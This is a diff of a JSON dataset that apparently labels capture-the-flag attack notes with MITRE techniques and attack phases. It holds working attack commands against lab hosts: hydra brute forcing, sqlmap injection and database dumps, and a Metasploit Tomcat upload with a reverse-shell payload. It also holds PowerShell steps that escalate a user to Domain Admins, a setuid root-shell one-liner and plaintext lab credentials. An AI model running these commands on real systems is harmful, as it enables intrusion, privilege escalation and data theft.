+        "action_description": "Crontab file example job line template, not an attacker command.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::37",
+      "layer": "command",
+      "label": "",
+      "entry_id": 37,
+      "source_file": "flag9f1f16.txt",
+      "command": "",
+      "reasoning": "17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly 25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ) 47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly ) 52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly ) # ---",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flag9f1f16",
+      "raw": {
+        "entry_id": 37,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": ""
+      },
+      "mitre": {
+        "entry_id": 37,
+        "technique_id": "T1053.003",
+        "technique_name": "Scheduled Task/Job: Cron",
+        "tactic": "discovery",
+        "confidence": 0.75
+      },
+      "actions_effects": {
+        "entry_id": 37,
+        "action_name": "noise",
+        "action_description": "Crontab file content showing default root cron jobs printed as tool output, not an attacker command.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#e8884a",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::38",
+      "layer": "command",
+      "label": "ftp and then login with this admin and password",
+      "entry_id": 38,
+      "source_file": "flagadcb1f.txt",
+      "command": "ftp and then login with this admin and password",
+      "reasoning": "[21][ftp] host: 10.0.3.197   login: admin   password: 1111 Commands",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flagadcb1f",
+      "raw": {
+        "entry_id": 38,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": "ftp and then login with this admin and password"
+      },
+      "mitre": {
+        "entry_id": 38,
+        "technique_id": "T1078",
+        "technique_name": "Valid Accounts",
+        "tactic": "initial-access",
+        "confidence": 0.82
+      },
+      "actions_effects": {
+        "entry_id": 38,
+        "action_name": "noise",
+        "action_description": "Prose note describing FTP login with discovered credentials, not an executable command.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#c97fc9",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::39",
+      "layer": "command",
+      "label": "hydra -L usernames.txt -p passwords.txt ftp://10.0.3.197 -t ",
+      "entry_id": 39,
+      "source_file": "flagadcb1f.txt",
+      "command": "hydra -L usernames.txt -p passwords.txt ftp://10.0.3.197 -t 4 -V",
+      "reasoning": "to find this",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flagadcb1f",
+      "raw": {
+        "entry_id": 39,
+        "tool": "hydra",
+        "action": "brute_force",
+        "target": "ftp://10.0.3.197",
+        "phase": "exploitation",
+        "is_noise": false,
+        "cleaned_command": "hydra -L usernames.txt -p passwords.txt ftp://10.0.3.197 -t 4 -V"
+      },
+      "mitre": {
+        "entry_id": 39,
+        "technique_id": "T1110",
+        "technique_name": "Brute Force",
+        "tactic": "credential-access",
         "confidence": 0.97
       },
       "actions_effects": {
-        "entry_id": 9,
-        "action_name": "findSUIDBinaries",
-        "action_description": "Search the filesystem for binaries with the SUID bit set that could be leveraged for privilege escalation.",
-        "phase": "post-exploitation",
-        "produces_effects": [
-          "suidBinariesFound"
-        ],
-        "requires_effects": [
-          "shellAccessGained"
-        ],
-        "is_noise": false
-      },
-      "color_command": "#f1c94e",
-      "color_mitre": "#e84a4a",
-      "color_action": "#f1c94e"
-    },
-    {
-      "id": "cmd::10",
-      "layer": "command",
-      "label": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
-      "entry_id": 10,
-      "source_file": "example.txt",
-      "command": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
-      "reasoning": "Found SUID binary. Exploiting for root.",
-      "output": "",
-      "exit_code": null,
-      "agent_name": "example",
-      "raw": {
-        "entry_id": 10,
-        "tool": "python3",
-        "action": "privilege_escalation",
-        "target": "localhost",
+        "entry_id": 39,
+        "action_name": "bruteForceFTP",
+        "action_description": "Use Hydra to brute-force FTP credentials against the target host using a username and password list.",
         "phase": "exploitation",
-        "is_noise": false,
-        "cleaned_command": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
-      },
-      "mitre": {
-        "entry_id": 10,
-        "technique_id": "T1548.001",
-        "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
-        "tactic": "privilege-escalation",
-        "confidence": 0.98
-      },
-      "actions_effects": {
-        "entry_id": 10,
-        "action_name": "exploitSUID",
-        "action_description": "Exploit a discovered SUID binary by invoking a Python privilege escalation payload to spawn a root shell.",
-        "phase": "post-exploitation",
         "produces_effects": [
-          "rootAccessGained"
+          "ftpCredentialsObtained"
         ],
         "requires_effects": [
-          "suidBinariesFound"
+          "openPortsKnown"
         ],
         "is_noise": false
       },
       "color_command": "#e84a4a",
-      "color_mitre": "#e84a4a",
-      "color_action": "#f1c94e"
+      "color_mitre": "#da77f2",
+      "color_action": "#e84a4a"
     },
     {
-      "id": "cmd::11",
+      "id": "cmd::40",
       "layer": "command",
-      "label": "cat /root/flag.txt",
-      "entry_id": 11,
-      "source_file": "example.txt",
-      "command": "cat /root/flag.txt",
-      "reasoning": "Got root! Reading the flag.",
+      "label": "nmap -p 21 10.0.3.0/24",
+      "entry_id": 40,
+      "source_file": "flagadcb1f.txt",
+      "command": "nmap -p 21 10.0.3.0/24",
+      "reasoning": "to find the IP of the host which has ftp open, i do this commad",
       "output": "",
       "exit_code": null,
-      "agent_name": "example",
+      "agent_name": "flagadcb1f",
       "raw": {
-        "entry_id": 11,
-        "tool": "cat",
-        "action": "flag_exfiltration",
-        "target": "/root/flag.txt",
-        "phase": "exfiltration",
+        "entry_id": 40,
+        "tool": "nmap",
+        "action": "port_scan",
+        "target": "10.0.3.0/24",
+        "phase": "reconnaissance",
         "is_noise": false,
-        "cleaned_command": "cat /root/flag.txt"
+        "cleaned_command": "nmap -p 21 10.0.3.0/24"
       },
       "mitre": {
-        "entry_id": 11,
-        "technique_id": "T1083",
-        "technique_name": "File and Directory Discovery",
-        "tactic": "collection",
-        "confidence": 0.85
+        "entry_id": 40,
+        "technique_id": "T1046",
+        "technique_name": "Network Service Discovery",
+        "tactic": "discovery",
+        "confidence": 0.97
       },
       "actions_effects": {
-        "entry_id": 11,
-        "action_name": "captureFlag",
-        "action_description": "Read the root flag file to confirm full system compromise and complete the challenge objective.",
-        "phase": "post-exploitation",
+        "entry_id": 40,
+        "action_name": "scanForOpenPort",
+        "action_description": "Scan an entire subnet for hosts with FTP port 21 open to identify the target.",
+        "phase": "reconnaissance",
         "produces_effects": [
-          "flagFound"
+          "ftpHostsIdentified"
         ],
-        "requires_effects": [
-          "rootAccessGained"
-        ],
+        "requires_effects": [],
         "is_noise": false
       },
-      "color_command": "#ff4757",
-      "color_mitre": "#a0522d",
-      "color_action": "#f1c94e"
+      "color_command": "#4e9af1",
+      "color_mitre": "#e8884a",
+      "color_action": "#4e9af1"
     },
     {
-      "id": "cmd::12",
+      "id": "cmd::41",
       "layer": "command",
-      "label": "cat /home/user/user.txt",
-      "entry_id": 12,
-      "source_file": "example.txt",
-      "command": "cat /home/user/user.txt",
-      "reasoning": "",
+      "label": "",
+      "entry_id": 41,
+      "source_file": "flagadcb1f.txt",
+      "command": "",
+      "reasoning": "then boom flag",
       "output": "",
       "exit_code": null,
-      "agent_name": "example",
+      "agent_name": "flagadcb1f",
       "raw": {
-        "entry_id": 12,
-        "tool": "cat",
-        "action": "flag_exfiltration",
-        "target": "/home/user/user.txt",
-        "phase": "exfiltration",
-        "is_noise": false,
-        "cleaned_command": "cat /home/user/user.txt"
+        "entry_id": 41,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": ""
       },
       "mitre": {
-        "entry_id": 12,
-        "technique_id": "T1083",
-        "technique_name": "File and Directory Discovery",
-        "tactic": "collection",
-        "confidence": 0.85
+        "entry_id": 41,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
       },
       "actions_effects": {
-        "entry_id": 12,
-        "action_name": "captureFlag",
-        "action_description": "Read the user-level flag file from the home directory to capture the user flag.",
+        "entry_id": 41,
+        "action_name": "noise",
+        "action_description": "Prose note with no command \u2014 not a real attack step.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::42",
+      "layer": "command",
+      "label": "msfconsole",
+      "entry_id": 42,
+      "source_file": "flagcd699a.txt",
+      "command": "msfconsole",
+      "reasoning": "download \"C:\\\\ProgramData\\\\Tomcat9\\\\flag{cd699a5719c85f42937554887f2c97f1cac37786abffa7}.jpg\" /home/kali/Desktop/flag.jpg this is the command used to send the flag over to mine and here is the steps i did to open the metasploit console to do the needful NOTES ON HOW TO USE METASPLOIT IS NOT IN THIS DOCUMENT Step 1",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flagcd699a",
+      "raw": {
+        "entry_id": 42,
+        "tool": "msfconsole",
+        "action": "launch_metasploit",
+        "target": "10.0.3.197",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "msfconsole"
+      },
+      "mitre": {
+        "entry_id": 42,
+        "technique_id": "T1059.002",
+        "technique_name": "Command and Scripting Interpreter: AppleScript",
+        "tactic": "execution",
+        "confidence": 0.55
+      },
+      "actions_effects": {
+        "entry_id": 42,
+        "action_name": "exploitTomcatManager",
+        "action_description": "Use Metasploit's tomcat_mgr_upload module to exploit the Tomcat Manager and obtain a Meterpreter shell.",
+        "phase": "exploitation",
+        "produces_effects": [
+          "meterpreterSessionEstablished",
+          "shellAccessGained"
+        ],
+        "requires_effects": [],
+        "is_noise": false
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#f1c94e",
+      "color_action": "#e84a4a"
+    },
+    {
+      "id": "cmd::43",
+      "layer": "command",
+      "label": "findstr /i \"cd699a\"",
+      "entry_id": 43,
+      "source_file": "flagcd699a.txt",
+      "command": "findstr /i \"cd699a\" - Filters for lines containing \"cd699a\" (case-insensitive due to /i)",
+      "reasoning": "use exploit/multi/http/tomcat_mgr_upload set RHOSTS 10.0.3.197 set RPORT 8282 set HttpUsername root set HttpPassword 1234 set LHOST 192.168.0.8 set payload java/meterpreter/reverse_tcp exploit then in the meterpreter, type shell then i had access to the shell and shows all the folders and shit bascially had access to the terminal of the tomcat manager thing then I used differnt commands to find the flag i tried to find the flag but thers no text string in the ones i found, so i tried to check the files names if they contain the keyword cd699a the command used for that is as follows dir /s /b C:\\ - Lists all files/folders on C:\\ drive recursively in bare format | - Pipes the output to the next command",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flagcd699a",
+      "raw": {
+        "entry_id": 43,
+        "tool": "findstr",
+        "action": "search_files",
+        "target": "C:\\",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "findstr /i \"cd699a\""
+      },
+      "mitre": {
+        "entry_id": 43,
+        "technique_id": "T1083",
+        "technique_name": "File and Directory Discovery",
+        "tactic": "discovery",
+        "confidence": 0.88
+      },
+      "actions_effects": {
+        "entry_id": 43,
+        "action_name": "searchFileSystem",
+        "action_description": "Recursively search the Windows filesystem for files whose names contain the flag keyword using dir and findstr.",
         "phase": "post-exploitation",
         "produces_effects": [
-          "flagFound"
+          "flagFileLocated"
         ],
         "requires_effects": [
           "shellAccessGained"
         ],
         "is_noise": false
       },
+      "color_command": "#f1c94e",
+      "color_mitre": "#e8884a",
+      "color_action": "#f1c94e"
+    },
+    {
+      "id": "cmd::44",
+      "layer": "command",
+      "label": "",
+      "entry_id": 44,
+      "source_file": "flagcd699a.txt",
+      "command": "",
+      "reasoning": "and this is the actual command dir /s /b C:\\ | findstr /i \"cd699a\" this is what i need to do but with the password i got the 90b3",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flagcd699a",
+      "raw": {
+        "entry_id": 44,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": ""
+      },
+      "mitre": {
+        "entry_id": 44,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
+      },
+      "actions_effects": {
+        "entry_id": 44,
+        "action_name": "noise",
+        "action_description": "Empty command \u2014 prose note describing a search command variant, not an executed step.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::45",
+      "layer": "command",
+      "label": "",
+      "entry_id": 45,
+      "source_file": "flagcfcec8.txt",
+      "command": "",
+      "reasoning": "This one, I have to learn a lot about as most of it is done in powershell and im not as comfortable with powershell as I'm with command prompt. so the task with this flag is getting access to the dekstop as administrator and then proceed with finding the flag under the users using reverse desktop protocol. Unfortunately, bloodhound wasnt working as expected, so I need to learn what it does and also sharphound and what it does. so need to know more about that. But since knowing the file locations, its not needed to do that, so the file tomcat-users.xml has a list of users and their password, using that I sign in thru rdp using those credentials Same host as the tomcat thing, so 10.0.3.197, so use metasploit to do so and then type shell to go to the command prompt and type powershell to do the following using Powershell, I granted myself persmissions or this user permissions and then logged out and then once I logged back in, it will work back again. Here are the list of commands used to do so and the guide to do so and what it means Phase 1: Reconnaissance & Enumeration Step 1: AD Module Import powershell Import-Module ActiveDirectory Loaded AD PowerShell module for domain enumeration Step 2: HelpDesk Group Discovery powershell Get-ADGroup \"HelpDesk\" Found: HelpDesk group exists with full AD details DistinguishedName: CN=HelpDesk,CN=Users,DC=internal,DC=initech,DC=local SID: S-1-5-21-264868819-4171338294-4143210697-1114 Phase 2: Privilege Escalation - HelpDesk Takeover Step 3: ADSI Object Creation powershell $group = [ADSI]\"LDAP://CN=HelpDesk,CN=Users,DC=internal,DC=initech,DC=local\" Created ADSI interface to manipulate HelpDesk group Step 4: Take Ownership powershell $user = New-Object System.Security.Principal.NTAccount(\"internal\\tomcat.svc\") $group.psbase.ObjectSecurity.SetOwner($user) $group.psbase.CommitChanges() Result: tomcat.svc became owner of HelpDesk group Step 5: Grant GenericAll Rights powershell Phase 1: Reconnaissance & Enumeration Step 1: AD Module Import powershell Command 1: Import-Module ActiveDirectory Loaded AD PowerShell module for domain enumeration Step 2: HelpDesk Group Discovery powershell Command 2: Get-ADGroup \"HelpDesk\" Found: HelpDesk group exists with full AD details DistinguishedName: CN=HelpDesk,CN=Users,DC=internal,DC=initech,DC=local SID: S-1-5-21-264868819-4171338294-4143210697-1114 Phase 2: Privilege Escalation - HelpDesk Takeover Step 3: ADSI Object Creation powershell COMMANDS: Command 3: $group = [ADSI]\"LDAP://CN=HelpDesk,CN=Users,DC=internal,DC=initech,DC=local\" Created ADSI interface to manipulate HelpDesk group Step 4: Take Ownership powershell COMMANDS: Command 4: $user = New-Object System.Security.Principal.NTAccount(\"internal\\tomcat.svc\") Command 5: $group.psbase.ObjectSecurity.SetOwner($user) Command 6: $group.psbase.CommitChanges() Result: tomcat.svc became owner of HelpDesk group Step 5: Grant GenericAll Rights powershell COMMANDS: Command 7: $acl = $group.psbase.ObjectSecurity Command 8: $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($user,\"GenericAll\", \"Allow\") Command 9: $acl.AddAccessRule($rule) Command 10: $group.psbase.CommitChanges() Result: tomcat.svc granted full control over HelpDesk group Phase 3: User Discovery & Group Manipulation Step 6: Find Valid Users in command Prompt type \"C:\\ProgramData\\Tomcat9\\conf\\tomcat-users.xml\" Discovered Credentials: root / 1234 crash_override / nebbie Step 7: Add User to HelpDesk powershell COMMANDS: Command 11: $helpdesk = [ADSI]\"LDAP://CN=HelpDesk,CN=Users,DC=internal,DC=initech,DC=local\" Command 12: $helpdesk.Add(\"LDAP://CN=crash_override,CN=Users,DC=internal,DC=initech,DC=local\") Command 13: $helpdesk.SetInfo() Result: crash_override added to HelpDesk group Command 14: $acl = $group.psbase.ObjectSecurity Command 15: $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($user,\"GenericAll\", \"Allow\") Command 16: $acl.AddAccessRule($rule) Command 17: $group.psbase.CommitChanges() Result: tomcat.svc granted full control over HelpDesk group Step 8: RDP Login Command 18: xfreerdp3 /u:crash_override /p:nebbie /v:10.0.3.197 /cert:ignore Step 9: Domain Admin Privilege Escalation powershell Command 19: $daGroup = [ADSI]\"LDAP://CN=Domain Admins,CN=Users,DC=internal,DC=initech,DC=local\" Command 20: $daGroup.Add(\"LDAP://CN=crash_override,CN=Users,DC=internal,DC=initech,DC=local\") Command 21: $daGroup.SetInfo() Result: crash_override added to Domain Admins group Step 10: Let changes kick in logout of RDP and then login again with the same rdp command and do a search or go to the domain admin folder under users to find the flag I hosted this device using HTTP commands using webserver and then transferred the flag to my device but didnt work much",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flagcfcec8",
+      "raw": {
+        "entry_id": 45,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": ""
+      },
+      "mitre": {
+        "entry_id": 45,
+        "technique_id": "T1484.001",
+        "technique_name": "Domain Policy Modification: Group Policy Modification",
+        "tactic": "privilege-escalation",
+        "confidence": 0.82
+      },
+      "actions_effects": {
+        "entry_id": 45,
+        "action_name": "noise",
+        "action_description": "Empty command \u2014 extended prose walkthrough of AD privilege escalation steps, not a single executed command.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#e84a4a",
+      "color_action": "#555555"
+    },
+    {
+      "id": "cmd::46",
+      "layer": "command",
+      "label": "sqlmap -u \"http://10.0.2.197/php/recherche_old.php\" --data=\"",
+      "entry_id": 46,
+      "source_file": "flagde3b1c.txt",
+      "command": "sqlmap -u \"http://10.0.2.197/php/recherche_old.php\" --data=\"recherche=&btnRechercher=Rechercher\" --cookie=\"PHPSESSID=tv27194dltn7srq401bhf4r237\" -p recherche --text-only --batch --dbs",
+      "reasoning": "So to find this flag, i need to do basic sql injection, so I need to tell the command where I\\m gonna inject the databse, theres a vulnerability in the recherche old page using the html code i found of the page, the input parameter is named recherche so i specfified that using -p recherche, --dump i dumped those in my kali under /.local/share/sqlmap/output --batch to say yes to all custom prompts during the injection --risk to go through all risks to inject (1 to 3, 3 being the highest) --level to go thru all levels and ways of sql injection, (1 to 5, 5 is highest) -u to specify the url which has the parameter --data to show the input parameter --drop-set-cookie to ignore new coookie and maintain mine and use mine --text-only makes sure it only sends back text instead of html --dbs to show all possible databases -D to specify database and then --tables to see the tables inside the database --os-shell gives u the shell access to the database",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flagde3b1c",
+      "raw": {
+        "entry_id": 46,
+        "tool": "sqlmap",
+        "action": "sql_injection",
+        "target": "http://10.0.2.197/php/recherche_old.php",
+        "phase": "exploitation",
+        "is_noise": false,
+        "cleaned_command": "sqlmap -u \"http://10.0.2.197/php/recherche_old.php\" --data=\"recherche=&btnRechercher=Rechercher\" --cookie=\"PHPSESSID=tv27194dltn7srq401bhf4r237\" -p recherche --text-only --batch --dbs"
+      },
+      "mitre": {
+        "entry_id": 46,
+        "technique_id": "T1190",
+        "technique_name": "Exploit Public-Facing Application",
+        "tactic": "initial-access",
+        "confidence": 0.95
+      },
+      "actions_effects": {
+        "entry_id": 46,
+        "action_name": "exploitSQLInjection",
+        "action_description": "Run sqlmap against a vulnerable PHP search parameter to confirm SQL injection and enumerate all databases.",
+        "phase": "exploitation",
+        "produces_effects": [
+          "sqlInjectionConfirmed",
+          "databasesEnumerated"
+        ],
+        "requires_effects": [],
+        "is_noise": false
+      },
+      "color_command": "#e84a4a",
+      "color_mitre": "#c97fc9",
+      "color_action": "#e84a4a"
+    },
+    {
+      "id": "cmd::47",
+      "layer": "command",
+      "label": "sqlmap -u \"http://10.0.2.197/php/recherche_old.php\" --data=\"",
+      "entry_id": 47,
+      "source_file": "flagde3b1c.txt",
+      "command": "sqlmap -u \"http://10.0.2.197/php/recherche_old.php\" --data=\"recherche=&btnRechercher=Rechercher\" --cookie=\"PHPSESSID=tv27194dltn7srq401bhf4r237\" -p recherche --level=5 --risk=3 --text-only --drop-set-cookie -D cuiteur --tables --batch",
+      "reasoning": "command to list out all databases",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flagde3b1c",
+      "raw": {
+        "entry_id": 47,
+        "tool": "sqlmap",
+        "action": "enumerate_tables",
+        "target": "http://10.0.2.197/php/recherche_old.php",
+        "phase": "exploitation",
+        "is_noise": false,
+        "cleaned_command": "sqlmap -u \"http://10.0.2.197/php/recherche_old.php\" --data=\"recherche=&btnRechercher=Rechercher\" --cookie=\"PHPSESSID=tv27194dltn7srq401bhf4r237\" -p recherche --level=5 --risk=3 --text-only --drop-set-cookie -D cuiteur --tables --batch"
+      },
+      "mitre": {
+        "entry_id": 47,
+        "technique_id": "T1190",
+        "technique_name": "Exploit Public-Facing Application",
+        "tactic": "initial-access",
+        "confidence": 0.95
+      },
+      "actions_effects": {
+        "entry_id": 47,
+        "action_name": "enumerateTables",
+        "action_description": "Use sqlmap to list all tables inside the target 'cuiteur' database.",
+        "phase": "exploitation",
+        "produces_effects": [
+          "tablesEnumerated"
+        ],
+        "requires_effects": [
+          "databasesEnumerated"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#e84a4a",
+      "color_mitre": "#c97fc9",
+      "color_action": "#e84a4a"
+    },
+    {
+      "id": "cmd::48",
+      "layer": "command",
+      "label": "sqlmap -u \"http://10.0.2.197/php/recherche_old.php\" --data=\"",
+      "entry_id": 48,
+      "source_file": "flagde3b1c.txt",
+      "command": "sqlmap -u \"http://10.0.2.197/php/recherche_old.php\" --data=\"recherche=&btnRechercher=Rechercher\" --cookie=\"PHPSESSID=tv27194dltn7srq401bhf4r237\" -p recherche --level=5 --risk=3 --text-only --drop-set-cookie -D cuiteur --dump --batch",
+      "reasoning": "command to list the tables in the cuiter database",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flagde3b1c",
+      "raw": {
+        "entry_id": 48,
+        "tool": "sqlmap",
+        "action": "dump_database",
+        "target": "http://10.0.2.197/php/recherche_old.php",
+        "phase": "exfiltration",
+        "is_noise": false,
+        "cleaned_command": "sqlmap -u \"http://10.0.2.197/php/recherche_old.php\" --data=\"recherche=&btnRechercher=Rechercher\" --cookie=\"PHPSESSID=tv27194dltn7srq401bhf4r237\" -p recherche --level=5 --risk=3 --text-only --drop-set-cookie -D cuiteur --dump --batch"
+      },
+      "mitre": {
+        "entry_id": 48,
+        "technique_id": "T1005",
+        "technique_name": "Data from Local System",
+        "tactic": "collection",
+        "confidence": 0.85
+      },
+      "actions_effects": {
+        "entry_id": 48,
+        "action_name": "dumpDatabase",
+        "action_description": "Use sqlmap to dump all data from the 'cuiteur' database to the local machine.",
+        "phase": "exfiltration",
+        "produces_effects": [
+          "databaseDumped"
+        ],
+        "requires_effects": [
+          "tablesEnumerated"
+        ],
+        "is_noise": false
+      },
       "color_command": "#ff4757",
       "color_mitre": "#a0522d",
-      "color_action": "#f1c94e"
+      "color_action": "#ff4757"
+    },
+    {
+      "id": "cmd::49",
+      "layer": "command",
+      "label": "sqlmap -u \"http://10.0.2.197/php/recherche_old.php\" --data=\"",
+      "entry_id": 49,
+      "source_file": "flagde3b1c.txt",
+      "command": "sqlmap -u \"http://10.0.2.197/php/recherche_old.php\" --data=\"recherche=&btnRechercher=Rechercher\" --cookie=\"PHPSESSID=tv27194dltn7srq401bhf4r237\" -p recherche --level=5 --risk=3 --text-only --drop-set-cookie -D mysql -T user --dump --batch",
+      "reasoning": "dump it on my local drive",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flagde3b1c",
+      "raw": {
+        "entry_id": 49,
+        "tool": "sqlmap",
+        "action": "dump_table",
+        "target": "http://10.0.2.197/php/recherche_old.php",
+        "phase": "exfiltration",
+        "is_noise": false,
+        "cleaned_command": "sqlmap -u \"http://10.0.2.197/php/recherche_old.php\" --data=\"recherche=&btnRechercher=Rechercher\" --cookie=\"PHPSESSID=tv27194dltn7srq401bhf4r237\" -p recherche --level=5 --risk=3 --text-only --drop-set-cookie -D mysql -T user --dump --batch"
+      },
+      "mitre": {
+        "entry_id": 49,
+        "technique_id": "T1552.001",
+        "technique_name": "Unsecured Credentials: Credentials In Files",
+        "tactic": "credential-access",
+        "confidence": 0.87
+      },
+      "actions_effects": {
+        "entry_id": 49,
+        "action_name": "dumpDatabase",
+        "action_description": "Use sqlmap to dump the mysql.user table, extracting database credentials.",
+        "phase": "exfiltration",
+        "produces_effects": [
+          "dbCredentialsDumped"
+        ],
+        "requires_effects": [
+          "databasesEnumerated"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#ff4757",
+      "color_mitre": "#da77f2",
+      "color_action": "#ff4757"
+    },
+    {
+      "id": "cmd::50",
+      "layer": "command",
+      "label": "sqlmap -u \"http://10.0.2.197/php/recherche_old.php\" --data=\"",
+      "entry_id": 50,
+      "source_file": "flagde3b1c.txt",
+      "command": "sqlmap -u \"http://10.0.2.197/php/recherche_old.php\" \\ --data=\"recherche=&btnRechercher=Rechercher\" \\ --cookie=\"PHPSESSID=tv27194dltn7srq401bhf4r237\" \\ -p recherche \\ --level=5 \\ --risk=3 \\ --text-only \\ --drop-set-cookie \\ --batch",
+      "reasoning": "dump a specific table on my local drive",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flagde3b1c",
+      "raw": {
+        "entry_id": 50,
+        "tool": "sqlmap",
+        "action": "sql_injection",
+        "target": "http://10.0.2.197/php/recherche_old.php",
+        "phase": "exploitation",
+        "is_noise": false,
+        "cleaned_command": "sqlmap -u \"http://10.0.2.197/php/recherche_old.php\" --data=\"recherche=&btnRechercher=Rechercher\" --cookie=\"PHPSESSID=tv27194dltn7srq401bhf4r237\" -p recherche --level=5 --risk=3 --text-only --drop-set-cookie --batch"
+      },
+      "mitre": {
+        "entry_id": 50,
+        "technique_id": "T1190",
+        "technique_name": "Exploit Public-Facing Application",
+        "tactic": "initial-access",
+        "confidence": 0.9
+      },
+      "actions_effects": {
+        "entry_id": 50,
+        "action_name": "exploitSQLInjection",
+        "action_description": "Run a baseline sqlmap scan against the vulnerable search parameter to confirm injection.",
+        "phase": "exploitation",
+        "produces_effects": [
+          "sqlInjectionConfirmed"
+        ],
+        "requires_effects": [],
+        "is_noise": false
+      },
+      "color_command": "#e84a4a",
+      "color_mitre": "#c97fc9",
+      "color_action": "#e84a4a"
+    },
+    {
+      "id": "cmd::51",
+      "layer": "command",
+      "label": "sqlmap -u \"http://10.0.2.197/php/recherche_old.php\" --cookie",
+      "entry_id": 51,
+      "source_file": "flagde3b1c.txt",
+      "command": "sqlmap -u \"http://10.0.2.197/php/recherche_old.php\" \\ --cookie=\"PHPSESSID=mh7tkt1n251va88ocamt5bhcp7\" \\ --data=\"recherche=test&btnRechercher=Rechercher\" \\ -p recherche \\ --dump \\ --batch",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flagde3b1c",
+      "raw": {
+        "entry_id": 51,
+        "tool": "sqlmap",
+        "action": "dump_database",
+        "target": "http://10.0.2.197/php/recherche_old.php",
+        "phase": "exfiltration",
+        "is_noise": false,
+        "cleaned_command": "sqlmap -u \"http://10.0.2.197/php/recherche_old.php\" --cookie=\"PHPSESSID=mh7tkt1n251va88ocamt5bhcp7\" --data=\"recherche=test&btnRechercher=Rechercher\" -p recherche --dump --batch"
+      },
+      "mitre": {
+        "entry_id": 51,
+        "technique_id": "T1005",
+        "technique_name": "Data from Local System",
+        "tactic": "collection",
+        "confidence": 0.83
+      },
+      "actions_effects": {
+        "entry_id": 51,
+        "action_name": "dumpDatabase",
+        "action_description": "Use sqlmap to dump all accessible database content with a refreshed session cookie.",
+        "phase": "exfiltration",
+        "produces_effects": [
+          "databaseDumped"
+        ],
+        "requires_effects": [
+          "databasesEnumerated"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#ff4757",
+      "color_mitre": "#a0522d",
+      "color_action": "#ff4757"
+    },
+    {
+      "id": "cmd::52",
+      "layer": "command",
+      "label": "",
+      "entry_id": 52,
+      "source_file": "flagde3b1c.txt",
+      "command": "",
+      "reasoning": "this is the command i used to find flag flag{de3b1c and i did sql injection to do it so u find a input query, do ' in the input query to find if it throws a databse error its injectible, if not then not i went to the old recherche page and in the search function ' it says welcome to the matrix, watch a vieo on sql injection and understand data",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "flagde3b1c",
+      "raw": {
+        "entry_id": 52,
+        "tool": "",
+        "action": "",
+        "target": "",
+        "phase": "noise",
+        "is_noise": true,
+        "cleaned_command": ""
+      },
+      "mitre": {
+        "entry_id": 52,
+        "technique_id": "T0000",
+        "technique_name": "Noise",
+        "tactic": "none",
+        "confidence": 0.0
+      },
+      "actions_effects": {
+        "entry_id": 52,
+        "action_name": "noise",
+        "action_description": "Empty command \u2014 prose note describing the SQL injection methodology and flag discovery outcome.",
+        "phase": "noise",
+        "produces_effects": [],
+        "requires_effects": [],
+        "is_noise": true
+      },
+      "color_command": "#555555",
+      "color_mitre": "#888888",
+      "color_action": "#555555"
     }
   ],
   "actions_effects_nodes": [
     {
